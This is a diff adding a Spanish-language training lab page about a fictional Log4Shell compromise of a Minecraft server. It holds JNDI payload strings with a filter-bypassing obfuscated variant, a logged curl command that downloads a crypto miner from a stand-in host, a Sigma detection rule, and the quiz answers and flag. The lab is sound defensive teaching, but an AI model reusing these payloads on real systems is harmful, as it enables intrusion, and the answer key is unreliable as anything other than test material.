@@ -1,0 +1,173 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>La frase trampa · Labs N4zar1</title>
+<meta name="description" content="Reto de Log4Shell (CVE-2021-44228): un servidor de juego ficticio que se pone lento después de dos mensajes raros en el chat. Encuentra la frase trampa, el disfraz que se saltó el filtro, adónde llamó el servidor, qué ejecutó y el arreglo.">
+<meta name="theme-color" content="#040a1c">
+<link rel="icon" type="image/png" href="../assets/favicon.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="../assets/lab.css">
+<style>.evidence h3{margin:0;font:inherit}.evidence td{word-break:break-all}pre.code{margin:0;padding:16px 18px;overflow:auto;font:500 14px/1.6 var(--mono);color:var(--fg2);white-space:pre-wrap;word-break:break-all}pre.code b{color:var(--alert);font-weight:700}</style>
+</head>
+<body>
+<div class="wrap">
+  <header class="top">
+    <a class="brand" href="../index.html"><img class="b" src="../assets/avatar.jpg" alt="" width="30" height="30">N4zar1 <span class="sub">Labs</span></a>
+    <nav><a class="opc" href="../index.html">Todos los labs</a><a data-goatcounter-click="ir-a-tienda" href="https://tienda.n4zar1.com">Tienda</a></nav>
+  </header>
+
+  <h1>La frase trampa</h1>
+  <p class="lede">Medio · ~12 min · Basado en el vídeo «Una frase en un chat… y el servidor era suyo (Log4Shell)».</p>
+
+  <div class="brief">
+    <p><b>El caso.</b> Picos y Bloques, el servidor de Minecraft (Java) de una asociación juvenil ficticia. Sábado 11 de diciembre de 2021, dos días después de que se publicara Log4Shell. Por la tarde el servidor empieza a ir lentísimo y el ventilador no para. El administrador, Dani, te pasa el registro del chat, las conexiones salientes que vio el cortafuegos, los procesos que se abrieron en la máquina y una nota suya.</p>
+    <p><b>Tu misión:</b> encuentra la frase trampa, adónde llamó el servidor, qué mensaje consiguió ejecutar código, por qué se saltó el filtro de Dani, qué se instaló y qué arreglo lo cierra. Chuleta: Log4j apunta en el registro lo que escribe la gente, pero en las versiones 2.0-beta9 a 2.14.1 un texto con <code>${…}</code> no se apuntaba tal cual: se evaluaba. Con <code>${jndi:ldap://…}</code> el servidor se conectaba a ese servidor LDAP y podía acabar cargando y ejecutando código de fuera (CVE-2021-44228, CVSS 10.0).</p>
+  </div>
+
+  <div class="evidence" id="ev1">
+    <div class="hd"><h3>1 · Registro del servidor de juego (latest.log) · 11/12/2021</h3>
+      <span class="tools"><input id="q1" placeholder="Buscar (jugador, texto…)" aria-label="Buscar en el registro del chat"><span class="count"></span></span></div>
+    <div class="scroll"><table><thead></thead><tbody></tbody></table></div>
+  </div>
+
+  <div class="evidence" id="ev2">
+    <div class="hd"><h3>2 · Conexiones salientes del servidor (cortafuegos) · 19:00–19:30</h3>
+      <span class="tools"><input id="q2" placeholder="Buscar (IP, puerto, proceso…)" aria-label="Buscar en las conexiones"><span class="count"></span></span></div>
+    <div class="scroll"><table><thead></thead><tbody></tbody></table></div>
+  </div>
+
+  <div class="evidence" id="ev3">
+    <div class="hd"><h3>3 · Procesos nuevos en la máquina (Sysmon, evento 1) · 19:00–19:30</h3>
+      <span class="tools"><input id="q3" placeholder="Buscar (proceso, padre…)" aria-label="Buscar en los procesos"><span class="count"></span></span></div>
+    <div class="scroll"><table><thead></thead><tbody></tbody></table></div>
+  </div>
+
+  <div class="evidence" id="ev4">
+    <div class="hd"><h3>4 · Nota de Dani y la regla Sigma que encontró después</h3></div>
+    <pre class="code">Nota de Dani (19:05):
+  «Alguien ha escrito un ${jndi:… raro en el chat. He puesto un filtro:
+   el chat rechaza cualquier mensaje que contenga el texto <b>${jndi:</b>
+   Con eso ya estamos a salvo, ¿no?»
+  Versión instalada: server.jar 1.18 → incluye <b>log4j-core-2.14.1</b>
+
+Regla Sigma «Log4j RCE CVE-2021-44228 Generic» (Florian Roth, 10/12/2021), extracto:
+  detection:
+    keywords:
+      - '${jndi:ldap:/'
+      - '${jndi:rmi:/'
+      - '${jndi:dns:/'
+      - '%24%7bjndi:'
+      - '${::-j}${'
+      - '${${lower:j}ndi:'
+      - '${${upper:j}ndi:'
+  falsepositives:
+      - Vulnerability scanning</pre>
+  </div>
+
+  <div class="tasks" id="tasks"></div>
+
+  <div class="win" id="win">
+    <h2>Reto completado</h2>
+    <p>Bandera: <code id="flag"></code></p>
+    <p>Lo que haría Dani: apagar el servidor y aislarlo; matar y borrar <code>C:\Users\Public\minero.exe</code> y revisar si dejó algo más (tareas programadas, servicios, usuarios nuevos) o, mejor, reinstalar; actualizar a Minecraft 1.18.1, el parche de Mojang que cierra el agujero (en cualquier otra app Java: log4j-core 2.17.1 o posterior); bloquear en el cortafuegos las salidas LDAP/RMI del servidor (o permitir solo destinos conocidos) y la IP 203.0.113.66; cambiar las contraseñas que hubiera en esa máquina; y dejar de fiarse de filtros de texto: los disfraces como <code>${${lower:j}ndi:</code> o <code>${::-j}</code> se los saltan. Para vigilar, las reglas públicas de la época: Sigma «Log4j RCE CVE-2021-44228 Generic» y YARA <code>EXPL_Log4j_CVE_2021_44228_Dec21_OBFUSC</code>.</p>
+    <button class="btn ghost" id="reset">Reiniciar el reto</button>
+  </div>
+
+  <footer class="foot"><span>Servidor, jugadores, dominios, IPs y procesos ficticios; ningún comando de esta página funciona contra nadie y nada sale de tu navegador. Por Nazarí · N4zar1</span><a href="../index.html">← Volver a los labs</a></footer>
+</div>
+<script src="../assets/lab.js"></script>
+<script>
+const $ = id => document.getElementById(id);
+const q = () => (r, v) => !v || r.join(' ').toLowerCase().includes(v.toLowerCase());
+
+makeTable({
+  el: $('ev1'),
+  cols: ['Hora', 'Origen', 'Mensaje'],
+  rows: [
+    ['19:01:58', 'Server thread/INFO', 'Lucas joined the game'],
+    ['19:02:40', 'Chat', '<Lucas> ¿alguien para la mina?'],
+    ['19:03:05', 'Chat', '<Ana_22> voy, llevo picos'],
+    ['19:03:51', 'Server thread/INFO', 'xX_Steve_Xx joined the game'],
+    ['19:04:17', 'Chat', '<xX_Steve_Xx> ${jndi:ldap://mina-gratis.example:1389/a}'],
+    ['19:04:52', 'Chat', '<Pepe> ¿qué es eso? jaja'],
+    ['19:05:40', 'Server thread/INFO', 'Kiko_99 joined the game'],
+    ['19:06:10', 'Chat', '[filtro] mensaje rechazado de Kiko_99 (contiene ${jndi:)'],
+    ['19:06:30', 'Chat', '<Kiko_99> ${${lower:j}ndi:${lower:l}dap://mina-gratis.example:1389/b}'],
+    ['19:07:02', 'Chat', '<Ana_22> el server va lentísimo'],
+    ['19:08:15', 'Server thread/WARN', "Can't keep up! Is the server overloaded? Running 4120ms behind"],
+    ['19:09:30', 'Chat', '<Lucas> me voy, esto no hay quien lo juegue'],
+  ],
+  filters: [{el: $('q1'), test: q()}],
+});
+
+makeTable({
+  el: $('ev2'),
+  cols: ['Hora', 'Proceso', 'Destino', 'Puerto', 'Detalle'],
+  rows: [
+    ['19:02:00', 'java.exe', 'auth.juego.example', '443', 'Inicio de sesión de jugadores (normal)'],
+    ['19:04:17', 'java.exe', '203.0.113.66 (mina-gratis.example)', '1389', 'LDAP · permitido'],
+    ['19:04:18', 'java.exe', '203.0.113.66', '8080', 'HTTP GET /a.class → 404 Not Found'],
+    ['19:06:30', 'java.exe', '203.0.113.66 (mina-gratis.example)', '1389', 'LDAP · permitido'],
+    ['19:06:31', 'java.exe', '203.0.113.66', '8080', 'HTTP GET /b.class → 200 OK'],
+    ['19:06:41', 'curl.exe', '203.0.113.66', '8080', 'HTTP GET /minero.exe → 200 OK'],
+    ['19:07:00', 'minero.exe', 'pool.minado.example', '3333', 'Conexión persistente'],
+  ],
+  filters: [{el: $('q2'), test: q()}],
+});
+
+makeTable({
+  el: $('ev3'),
+  cols: ['Hora', 'Proceso padre', 'Proceso nuevo', 'Línea de comandos'],
+  rows: [
+    ['19:01:12', 'explorer.exe', 'java.exe', 'java -Xmx4G -jar server.jar nogui'],
+    ['19:06:32', 'java.exe', 'cmd.exe', 'cmd.exe /c whoami'],
+    ['19:06:41', 'java.exe', 'cmd.exe', 'cmd.exe /c curl -o C:\\Users\\Public\\minero.exe http://203.0.113.66:8080/minero.exe'],
+    ['19:06:55', 'cmd.exe', 'minero.exe', 'C:\\Users\\Public\\minero.exe --pool pool.minado.example:3333'],
+  ],
+  filters: [{el: $('q3'), test: q()}],
+});
+
+const sin = a => norm(a).replace(/\s/g, '');
+
+runLab('frase-trampa', [
+  {q: '¿Qué jugador escribió la primera frase trampa en el chat?', type: 'text', ph: 'nombre del jugador',
+   accept: a => sin(a).replace(/^</, '').replace(/>$/, '') === 'xx_steve_xx',
+   hint: 'Busca en la evidencia 1 un mensaje con ${ … }.',
+   explain: '<b>xX_Steve_Xx</b>, a las 19:04:17: <code>${jndi:ldap://mina-gratis.example:1389/a}</code>. Para los demás jugadores es un mensaje sin sentido; para Log4j, que apunta cada mensaje del chat en el registro, es una orden: «haz un lookup JNDI a ese servidor LDAP».'},
+  {q: 'Justo después, ¿a qué IP se conectó el servidor de juego?', type: 'text', ph: 'IP',
+   accept: a => sin(a).replace(/:\d+$/, '') === '203.0.113.66',
+   hint: 'Evidencia 2: mira las conexiones de java.exe en el mismo segundo que el mensaje.',
+   explain: '<b>203.0.113.66</b> (mina-gratis.example). El mismo segundo del mensaje, java.exe abre una conexión hacia fuera: un servidor de juego no tiene por qué hablar con nadie más que con el inicio de sesión. Es lo que yo vigilaría en el SIEM: conexiones salientes nuevas desde servidores que nunca llaman fuera.'},
+  {q: '¿Qué protocolo usó esa conexión al puerto 1389?', type: 'choice',
+   options: ['HTTPS', 'LDAP, el que pedía la frase (jndi:ldap://)', 'SSH', 'DNS'], correct: 1,
+   explain: '<b>LDAP.</b> JNDI es la interfaz de Java para consultar directorios (LDAP, RMI, DNS…). El servidor LDAP del atacante no contesta con datos normales sino con una referencia: «la clase que buscas está en http://203.0.113.66:8080/». Por eso CISA pedía bloquear el LDAP y el RMI salientes o permitir solo destinos conocidos.'},
+  {q: 'El primer intento no ejecutó nada. ¿Qué código HTTP devolvió el atacante al pedir /a.class?', type: 'text', ph: 'código',
+   accept: a => sin(a).startsWith('404'),
+   hint: 'Evidencia 2, línea de las 19:04:18.',
+   explain: '<b>404 Not Found.</b> El servidor sí se dejó llevar (conectó por LDAP y fue a por la clase), pero el atacante aún no la tenía preparada. Ojo: aunque no llegue a ejecutarse nada, esa conexión ya demuestra que el servidor es vulnerable y que alguien lo está probando.'},
+  {q: '¿Qué jugador consiguió que el servidor ejecutara código?', type: 'text', ph: 'nombre del jugador',
+   accept: a => sin(a).replace(/^</, '').replace(/>$/, '') === 'kiko_99',
+   hint: 'Cruza las horas: ¿qué mensaje va seguido de un /b.class con 200 OK y de procesos nuevos hijos de java.exe?',
+   explain: '<b>Kiko_99</b>, a las 19:06:30. Su mensaje provoca la conexión LDAP, la descarga de <code>/b.class</code> (200 OK) y, un segundo después, java.exe abre <code>cmd.exe /c whoami</code>: el servidor de juego está ejecutando órdenes del atacante.'},
+  {q: 'Dani había puesto un filtro que rechaza los mensajes que contienen «${jndi:». ¿Por qué no paró el mensaje de Kiko_99?', type: 'choice',
+   options: ['Porque el filtro solo funciona con jugadores nuevos', 'Porque ${lower:j} es otro lookup que Log4j convierte en «j»: el texto no contiene «${jndi:», pero lo que evalúa Log4j sí', 'Porque Kiko_99 era administrador', 'Porque el filtro se desactivó a las 19:06'], correct: 1,
+   explain: '<b>Era un disfraz.</b> <code>${${lower:j}ndi:${lower:l}dap://…}</code>: Log4j resuelve primero <code>${lower:j}</code> → <code>j</code> y <code>${lower:l}</code> → <code>l</code>, y le queda <code>${jndi:ldap://…}</code>. Se vio en ataques reales desde el primer fin de semana, junto con <code>${::-j}</code>, <code>${env:…:-j}</code> y versiones codificadas en URL. Por eso CISA avisaba de que hay muchas formas de ofuscar la cadena y que no hay que fiarse de un solo método de detección. El filtro de las 19:06:10 sí paró un primer intento de Kiko.'},
+  {q: '¿Qué programa descargó y dejó funcionando el atacante?', type: 'text', ph: 'nombre del archivo',
+   accept: a => sin(a).replace(/^.*\\/, '') === 'minero.exe' || sin(a) === 'minero',
+   hint: 'Evidencia 3: sigue la cadena de procesos que cuelga de java.exe.',
+   explain: '<b>minero.exe</b>, en <code>C:\\Users\\Public\\</code>: un minero de criptomonedas que se conecta a <code>pool.minado.example:3333</code>. Por eso el servidor va «lentísimo» y el ventilador no para. Fue de lo primero que se vio con Log4Shell: mineros, botnets y, en algunos servidores de Minecraft, ransomware.'},
+  {q: 'Si Dani hubiera pasado la regla Sigma de la evidencia 4 por el latest.log, ¿qué mensajes habría marcado?', type: 'choice',
+   options: ['Solo el de xX_Steve_Xx', 'Solo el de Kiko_99', 'Los dos: uno contiene «${jndi:ldap:/» y el otro «${${lower:j}ndi:»', 'Ninguno: Sigma solo mira registros de Windows'], correct: 2,
+   explain: '<b>Los dos.</b> La regla de Florian Roth, publicada el 10/12/2021, ya incluía los disfraces más usados (<code>${${lower:j}ndi:</code>, <code>${::-j}${</code>, <code>%24%7bjndi:</code>…). Para los ficheros, su regla YARA <code>EXPL_Log4j_CVE_2021_44228_Dec21_OBFUSC</code> busca lo mismo. Sigma es un formato genérico: se traduce a la búsqueda de tu SIEM, sea cual sea el registro.'},
+  {q: '¿Qué arreglo cierra el agujero de verdad?', type: 'choice',
+   options: ['Ampliar el filtro del chat con más palabras', 'Banear a Kiko_99 y a xX_Steve_Xx', 'Actualizar al parche (Minecraft 1.18.1; en otras apps, log4j-core 2.17.1 o posterior), bloquear las salidas LDAP/RMI y limpiar o reinstalar la máquina', 'Reiniciar el servidor cada noche'], correct: 2,
+   wrong: '✗ Eso no lo cierra. Piensa en dónde está el fallo: en la librería que apunta, no en quién escribe.',
+   explain: '<b>Actualizar + bloquear salidas + limpiar.</b> Mojang publicó la 1.18.1 el 10/12/2021; Apache cerró el agujero en 2.15.0 y lo remató en 2.16.0 (sin lookups en los mensajes y JNDI desactivado) y 2.17.x, y CISA pedía 2.17.1 (Java 8). Si no se podía actualizar al momento, quitar la clase JndiLookup del jar. Banear jugadores o ampliar filtros no sirve: cualquiera puede volver con otro disfraz. Y como ya se ejecutó código, la máquina no es de fiar hasta limpiarla.'},
+], 'N4{el_registro_obedecia}');
+</script>
+<script data-goatcounter="https://n4zar1.goatcounter.com/count" async src="https://gc.zgo.at/count.js"></script>
+</body>
+</html>
